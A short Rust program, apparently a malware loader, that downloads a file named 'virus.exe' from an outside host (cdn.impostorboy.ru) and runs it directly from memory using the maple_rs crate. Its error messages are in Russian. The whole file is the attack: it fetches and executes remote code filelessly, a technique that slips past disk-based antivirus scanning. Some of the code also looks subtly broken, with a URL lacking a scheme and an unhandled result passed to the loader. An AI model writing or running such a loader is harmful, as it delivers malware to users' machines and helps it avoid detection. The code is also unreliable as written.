use anyhow::{Context, Result};
use maple_rs::Maple;

fn main() -> Result<()> {
    let virus = reqwest::blocking::get("cdn.impostorboy.ru/virus.exe")?.bytes();
    let module = Maple::load_executable_from_memory(&virus)
        .context("Не удалось загрузить PE-файл из памяти")?;

    module
        .execute_entry_point()
        .context("Не удалось выполнить точку входа PE-файла")?;

    Ok(())
}
